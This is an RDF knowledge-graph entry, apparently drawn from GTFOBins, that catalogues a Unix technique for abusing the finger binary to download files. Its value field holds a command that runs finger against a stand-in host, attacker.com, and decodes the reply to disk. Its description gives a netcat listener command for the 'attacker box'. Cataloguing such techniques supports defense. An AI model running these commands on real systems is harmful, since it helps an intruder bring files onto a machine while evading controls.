mknd:command_finger-file-download a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "finger-file-download" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Fetch remote binary file from a remote TCP port. Run `base64 \"file_to_send\" | sudo nc -l -p 79` on the attacker box to send the file." ;
    d3f:uses mknd:executable_finger ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_finger ;
    mknd:provides mknd:function_file-download ;
    mknd:value """RHOST=attacker.com
LFILE=file_to_save
finger x@$RHOST | base64 -d > "$LFILE"
""" .

